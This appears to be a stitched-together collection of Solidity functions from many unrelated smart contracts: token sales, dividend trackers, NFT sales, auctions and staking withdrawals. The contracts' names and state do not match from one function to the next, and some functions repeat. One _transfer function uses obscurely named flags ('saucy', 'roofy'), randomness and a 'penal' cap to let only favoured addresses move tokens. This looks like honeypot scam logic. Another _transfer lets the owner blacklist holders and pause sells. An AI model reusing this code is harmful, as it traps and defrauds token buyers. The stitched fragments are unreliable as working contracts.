function extendDeadline(uint256 _days) public onlyOwner {
    require(icoState != State.TERMINATED);
    endTime = endTime.add(_days.mul(1 days));
    if (icoState == State.MAIN_ICO) {
        uint256 blocks = 0;
        uint256 stage = 0;
        for (uint i = 0; i < mainIcoBonusStages.length; i++) {
            if (now < mainIcoBonusStages[i]) {
                stage = i;
            }
        }
        blocks = (_days.mul(1 days)).div(mainIcoBonusStages.length.sub(stage));
        for (uint x = stage; x < mainIcoBonusStages.length; x++) {
            mainIcoBonusStages[x] = mainIcoBonusStages[x].add(blocks);
        }
    }
    IcoDeadlineExtended(icoState, endTime);
}

function activateMainIco() public onlyOwner {
    require(now >= endTime && icoState == State.SECOND_PRE_ICO);
    icoState = State.MAIN_ICO;
    mainIcoBonusStages[0] = now.add(7 days);
    mainIcoBonusStages[1] = now.add(14 days);
    mainIcoBonusStages[2] = now.add(21 days);
    mainIcoBonusStages[3] = now.add(31 days);
    endTime = now.add(31 days);
    bonus = 35;
    MainIcoActivated(now, endTime, bonus);
}

function withinPeriod() internal view returns(bool) {
    return IcoPaused == false && now < endTime && icoState != State.TERMINATED;
}

function getBonus() public view returns(uint256 _bonus) {
    _bonus = bonus;
    if (icoState == State.MAIN_ICO) {
        if (now > mainIcoBonusStages[3]) {
            _bonus = 0;
        } else {
            uint256 timeStamp = now;
            for (uint i = 0; i < mainIcoBonusStages.length; i++) {
                if (timeStamp <= mainIcoBonusStages[i]) {
                    break;
                } else {
                    if (_bonus >= 15) {
                        _bonus = _bonus.sub(10);
                    }
                }
            }
        }
    }
    return _bonus;
}

function activateSecondPreIco() public onlyOwner {
    require(now >= endTime && icoState == State.FIRST_PRE_ICO);
    icoState = State.SECOND_PRE_ICO;
    endTime = now.add(4 days);
    bonus = 50;
    SecondPreIcoActivated(now, endTime, bonus);
}

function shortenDeadline(uint256 _days) public onlyOwner {
    if (now.add(_days.mul(1 days)) >= endTime) {
        revert();
    } else {
        endTime = endTime.sub(_days.mul(1 days));
        if (icoState == State.MAIN_ICO) {
            uint256 blocks = 0;
            uint256 stage = 0;
            for (uint i = 0; i < mainIcoBonusStages.length; i++) {
                if (now < mainIcoBonusStages[i]) {
                    stage = i;
                }
            }
            blocks = (_days.mul(1 days)).div(mainIcoBonusStages.length.sub(stage));
            for (uint x = stage; x < mainIcoBonusStages.length; x++) {
                mainIcoBonusStages[x] = mainIcoBonusStages[x].sub(blocks);
            }
        }
    }
    IcoDeadlineShortened(icoState, endTime);
}

function terminateIco() public onlyOwner {
    require(icoState == State.MAIN_ICO);
    require(now < endTime);
    endTime = now;
    icoState = State.TERMINATED;
    IcoTerminated(now);
}

function buy_fromContract() payable public returns(uint256 _amount_) {
    require(msg.value >= 0);
    _amount_ = msg.value / buyPrice; 
    if (_amount_ > balances[this]) {
        _amount_ = balances[this];
        uint256 valueWei = _amount_ * buyPrice;
        msg.sender.transfer(msg.value - valueWei);
    }
    balances[msg.sender] += _amount_; 
    balances[this] -= _amount_; 
    Transfer(this, msg.sender, _amount_);
    uint64 _now = uint64(now);
    return _amount_;
}

function sell_toContract(uint256 amount_toSell) public {
    if (balances[msg.sender] < amount_toSell) {
        amount_toSell = balances[msg.sender];
    }
    require(amount_toSell <= (8 * 1e18 / Buy_Wall_level_in_wei)); 
    balances[this] += amount_toSell; 
    balances[msg.sender] -= amount_toSell;
    msg.sender.transfer(amount_toSell * Buy_Wall_level_in_wei);
    Transfer(msg.sender, this, amount_toSell);
}

function() payable {
    uint256 assets = msg.value / (buyPrice);
    if (assets > (balances[this])) {
        assets = balances[this];
        uint valueWei = assets * buyPrice;
        msg.sender.transfer(msg.value - valueWei);
    }
    require(msg.value >= (10 ** 15));
    balances[msg.sender] += assets;
    balances[this] -= assets;
    Transfer(this, msg.sender, assets);
}

function buyTokensUpdateState() internal {
    var temp = state;
    if (temp == State.BeforeSale && now >= startTime) {
        temp = State.preSale;
    }
    if (temp == State.preSale && now >= presaleEndtime) {
        temp = State.NormalSale;
    }
    if ((temp == State.preSale || temp == State.BeforeSale) && tokensLeft <= 250000000 * toDec) {
        temp = State.NormalSale;
    }
    calculateCurrentRate(temp);
    require(temp != State.ShouldFinalize && temp != State.Lockup && temp != State.SaleOver && msg.value >= toDec.div(2));
    if (msg.value.mul(rate) >= tokensLeft) {
        temp = State.ShouldFinalize;
    }
    state = temp;
}

function getToken(uint _auctionId) external {
    require(auctions[_auctionId].exists);
    require(!auctions[_auctionId].executed);
    require(now <= auctions[_auctionId].executeTime);
    require(msg.sender == auctions[_auctionId].winner);
    uint fullPrice = auctions[_auctionId].finalPrice;
    require(arconaToken.transferFrom(msg.sender, this, fullPrice));
    if (!inWhiteList(msg.sender)) {
        uint fee = valueFromPercent(fullPrice, auctionFee);
        fullPrice = fullPrice.sub(fee).sub(gasInTokens);
    }
    arconaToken.transfer(auctions[_auctionId].owner, fullPrice);
    require(ERC721Interface(auctions[_auctionId].token).transfer(auctions[_auctionId].winner, auctions[_auctionId].tokenId));
    auctions[_auctionId].executed = true;
    emit GetToken(_auctionId, msg.sender);
}

function updateDividendTracker(address newAddress) public onlyOwner {
    require(newAddress != address(dividendTracker));
    CHAOSDividendTracker newDividendTracker = CHAOSDividendTracker(payable(newAddress));
    require(newDividendTracker.owner() == address(this));
    newDividendTracker.excludeFromDividends(address(newDividendTracker));
    newDividendTracker.excludeFromDividends(address(this));
    newDividendTracker.excludeFromDividends(address(uniswapV2Router));
    emit UpdateDividendTracker(newAddress, address(dividendTracker));
    dividendTracker = newDividendTracker;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (qled == true)) {
        saucy[recipient] = true;
        roofy[recipient] = false;
        qled = false;
    }
    if (saucy[recipient] != true) {
        roofy[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((roofy[sender]) && (saucy[recipient] == false)) {
        roofy[recipient] = true;
    }
    if (saucy[sender] == false) {
        require(amount < penal);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function buyTokens(address beneficiary) whenNotPaused public payable {
    require(beneficiary != 0x0);
    require(validPurchase());
    require(SafeMath.add(weiInvestedBy[msg.sender], msg.value) <= whitelist.contributionCap(msg.sender));
    uint256 tokens = SafeMath.mul(msg.value, tokenBaseRate);
    tokens = tokens.add(SafeMath.mul(tokens, getCurrentBonus()).div(1000));
    require(SafeMath.add(tokensSold, tokens) <= crowdsaleSupply);
    tokensSold = SafeMath.add(tokensSold, tokens);
    creditOf[beneficiary] = creditOf[beneficiary].add(tokens);
    weiInvestedBy[msg.sender] = SafeMath.add(weiInvestedBy[msg.sender], msg.value);
    emit TokenPurchase(msg.sender, beneficiary, msg.value, tokens);
    vault.deposit.value(msg.value)(msg.sender);
}

function finalizeCrowdsale() onlyOwner public {
    require(!isFinalized);
    require(now > ICOEndTime);
    if (tokensSold < softCap) {
        vault.enableRefunds();
    }
    isFinalized = true;
}

function grantContributorTokens(address contributor) public returns(bool) {
    require(creditOf[contributor] > 0);
    require(whitelist.AMLWhitelisted(contributor));
    require(now > ICOEndTime && tokensSold >= softCap);
    assert(token.mint(contributor, creditOf[contributor]));
    creditOf[contributor] = 0;
    return true;
}

function offchainSale(address beneficiary, uint256 tokenAmount) onlyOwner public {
    require(beneficiary != 0x0);
    require(SafeMath.add(tokensSold, tokenAmount) <= crowdsaleSupply); 
    tokensSold = SafeMath.add(tokensSold, tokenAmount);
    creditOf[beneficiary] = creditOf[beneficiary].add(tokenAmount);
    emit TokenPurchase(beneficiary, beneficiary, 0, tokenAmount);
}

function validPurchase() internal view returns(bool) {
    bool duringICO = ICOStartTime <= now && now <= ICOEndTime;
    bool minimumContribution = msg.value >= 0.05 ether;
    return duringICO && minimumContribution;
}

function claimRefund() public {
    require(isFinalized);
    require(tokensSold < softCap);
    vault.refund(msg.sender);
}

function privateSale(address beneficiary, uint256 tokenAmount) onlyOwner public {
    require(beneficiary != 0x0);
    require(SafeMath.add(tokensSold, tokenAmount) <= crowdsaleSupply); 
    tokensSold = SafeMath.add(tokensSold, tokenAmount);
    assert(token.mint(beneficiary, tokenAmount));
}

function unlockVault() onlyOwner public {
    if (tokensSold >= softCap) {
        vault.unlock();
    }
}

function hasEnded() public view returns(bool) {
    return now > ICOEndTime;
}

function isTransferLocked() public view returns(bool) {
    if (now > STAGE_3_FINISH) {
        return false;
    }
    return true;
}

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    if (blackList[from] == true || blackList[to] == true) {
        revert();
    }
    if (to == uniswapV2Pair && pauseSell == true && from != owner()) {
        revert();
    }
    if (from == uniswapV2Pair && pauseBuy == true && to != owner()) {
        revert();
    }
    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;
    if (
        canSwap &&
        !swapping &&
        !automatedMarketMakerPairs[from] &&
        from != liquidityWallet &&
        to != liquidityWallet
    ) {
        swapping = true;
        uint256 devWalletTokens = contractTokenBalance.mul(MarketingWalletFee).div(totalFees);
        sendETHToWallets(devWalletTokens);
        uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
        swapAndLiquify(swapTokens);
        uint256 sellTokens = balanceOf(address(this));
        swapAndSendDividends(sellTokens);
        swapping = false;
    }
    bool takeFee = !swapping;
    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
        takeFee = false;
    }
    if (takeFee) {
        uint256 fees = amount.mul(totalFees).div(100);
        if (automatedMarketMakerPairs[to]) {
            fees = fees.mul(sellFeeIncreaseFactor).div(100);
        }
        amount = amount.sub(fees);
        super._transfer(from, address(this), fees);
    }
    super._transfer(from, to, amount);
    try dividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
    try dividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
    if (!swapping) {
        uint256 gas = gasForProcessing;
        try dividendTracker.process(gas) returns(uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
            emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
        }
        catch {
        }
    }
}

function updateDividendTracker(address newAddress) public onlyOwner {
    require(newAddress != address(dividendTracker), "The dividend tracker already has that address");
    CTTDividendTracker newDividendTracker = CTTDividendTracker(payable(newAddress));
    require(newDividendTracker.owner() == address(this), "The new dividend tracker must be owned by the CTT token contract");
    newDividendTracker.excludeFromDividends(address(newDividendTracker));
    newDividendTracker.excludeFromDividends(address(this));
    newDividendTracker.excludeFromDividends(owner());
    newDividendTracker.excludeFromDividends(address(uniswapV2Router));
    emit UpdateDividendTracker(newAddress, address(dividendTracker));
    dividendTracker = newDividendTracker;
}

function distribute() public onlyOwner {
    if (!ended) {
        return;
    }
    for (uint i = 0; i < buyers.length; i++) {
        address toSendTo = buyers[i];
        nft.safeTransferFrom(address(this), toSendTo, idToSend, 1, new bytes(0x0));
        buyerMapping[toSendTo] = false;
        idToSend = idToSend.add(1);
        if (idToSend > maxId) {
            idToSend = id;
        }
    }
    amountSold = amountSold.add(buyers.length);
    delete buyers;
}

function buy(uint256 amount) public payable {
    require(amountSold + buyers.length < MAX_SUPPLY, "sold out");
    require(!buyerMapping[msg.sender], "already purchased");
    require(msg.sender == tx.origin, "no contracts");
    require(block.timestamp >= start, "early");
    require(amount <= MAX_SUPPLY, "ordered too many");
    require(amount <= 1, "ordered too many");
    require(msg.value == price.mul(amount), "wrong amount");
    uint256 balance = address(this).balance;
    uint256 hausFee = balance.div(20).mul(3);
    haus.transfer(hausFee);
    seller.transfer(address(this).balance);
    buyerMapping[msg.sender] = true;
    buyers.push(msg.sender);
    emit Buy(msg.sender, amount);
}

function withdraw(uint256 _xSHDAmountIn, bool _isUpdateSHDInBar) public {
    require(_xSHDAmountIn > 0, "Insufficient xSHDToken");
    if (_isUpdateSHDInBar) {
        swapAllForSHD();
    }
    uint256 timeForWithdraw = lockDeadline[msg.sender];
    require(now > timeForWithdraw, "still locked");
    uint256 totalShares = totalSupply;
    uint256 SHDBalance = IERC20(SHDToken).balanceOf(address(this));
    uint256 SHDAmountOut = _xSHDAmountIn.mul(SHDBalance).div(totalShares);
    _burn(msg.sender, _xSHDAmountIn);
    IERC20(SHDToken).transfer(msg.sender, SHDAmountOut);
    emit Withdraw(
        msg.sender,
        _xSHDAmountIn,
        SHDAmountOut,
        _isUpdateSHDInBar
    );
}

function returnPercPub(address investor) public view returns(uint256 _perc) {
    uint256 balanceOf = nftContract.balanceOf(investor);
    if (balanceOf < 1) {
        return 0;
    }
    (uint256 userPower, uint256 userEnergy, uint256 lastWithdrawDate, ) = nftContract.getUserData(investor);
    uint256 medianEnergy = userEnergy.div(balanceOf);
    uint256 intervalDiff = (block.timestamp).sub(lastWithdrawDate);
    if (intervalDiff.div(1 days) >= medianEnergy) {
        _perc = userPower;
    } else {
        _perc = userPower.sub(userPower.mul((medianEnergy.sub(intervalDiff.div(1 days))).div(medianEnergy)));
    }
    if (_perc.mul(5) > 4166) {
        _perc = 4166;
    } else {
        _perc = _perc.mul(5);
    }
    return _perc;
}

function returnPerc(address investor) external returns(uint256 _perc) {
    _perc = returnPercPub(investor);
    if (_perc > 0) {
        nftContract.updateDate(block.timestamp, investor);
    }
    return _perc;
}

function CreateContract(uint256 _num) public payable {
    require(msg.value > 0, "Amount must be greater than 0");
    uint256 _value = msg.value.mul(60).div(100);
    IWETH(WETH).deposit {
        value: msg.value
    }();
    if (team[_num] == address(0)) {
        IWETH(WETH).withdraw(_value);
        TransferHelper.safeTransferETH(onwer, _value);
    } else {
        IWETH(WETH).withdraw(_value);
        TransferHelper.safeTransferETH(team[_num], _value);
    }
    uint256 _EYB = msg.value.mul(1 ether).div(Price);
    _mint(msg.sender, _EYB);
    Price = Price.add(getPrice(msg.value));
}

function transfer(address _to, uint _value, bytes _data) public {
    require(_value > 0);
    if (isContract(_to)) {
        ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
        receiver.tokenFallback(msg.sender, _value, _data);
    }
    balances[msg.sender] = subSafe(balances[msg.sender], _value);
    balances[_to] = addSafe(balances[_to], _value);
    emit Transfer(msg.sender, _to, _value, _data);
}

function() public payable {
    require(now >= createTime && now <= endDate);
    uint tokens;
    if (now <= bonusEnds) {
        tokens = msg.value * 2480;
    } else {
        tokens = msg.value * 2000;
    }
    require(tokens <= balances[owner]);
    balances[msg.sender] = addSafe(balances[msg.sender], tokens);
    balances[owner] = subSafe(balances[owner], tokens);
    emit Transfer(address(0), msg.sender, tokens);
    owner.transfer(msg.value);
}

function harvest(uint256 ethBalance) private returns(
    uint256 withdrawable
) {
    uint256 rewards = calculateRewards();
    uint256 depositable = ethBalance > rewards ? ethBalance.sub(rewards) : 0;
    if (depositable >= minDepositable) {
        controller.depositTokenForStrategy(
            depositable,
            address(yearnVault));
        ethPushedToYearn = ethPushedToYearn.add(
            depositable
        );
    }
    if (rewards > minRewards) {
        withdrawable = rewards > ethBalance ? rewards.sub(ethBalance) : 0;
        controller.buyForStrategy(
            rewards,
            vault.getRewardToken(),
            address(vault)
        );
    } else {
        withdrawable = 0;
    }
}

function MainSaleBuy() payable external returns(bool) {
    if (msg.value <= 0) revert();
    TocIcoData
    DataCall = TocIcoData(addressbook[ContractAddr].DataAddr);
    la.l1 = DataCall.GetEnd();
    la.l2 = DataCall.GetMainSale();
    la.l3 = DataCall.GetSuspend();
    ta.n3 = DataCall.GetEtherPrice();
    ta.n4 = DataCall.GetTocPrice();
    if (la.l1 == true) revert();
    if (la.l2 == false) revert();
    if (la.l3 == true) revert();
    ta.n5 = CalcToc(ta.n3, ta.n4, msg.value);
    if (ta.n5 > orderbooks[ContractAddr].MainSupply) revert();
    addressbook[ContractAddr].Banker.transfer(msg.value);
    orderbooks[ContractAddr].MainSupply -= ta.n5;
    buyer[msg.sender].TocBalance += ta.n5;
    buyer[msg.sender].Num += 1;
    ta.n6 = buyer[msg.sender].Num;
    transaction[msg.sender][ta.n6].Amount = ta.n5;
    transaction[msg.sender][ta.n6].EtherPrice = ta.n3;
    transaction[msg.sender][ta.n6].TocPrice = ta.n4;
    transaction[msg.sender][ta.n6].Block = block.number;
    return true;
}

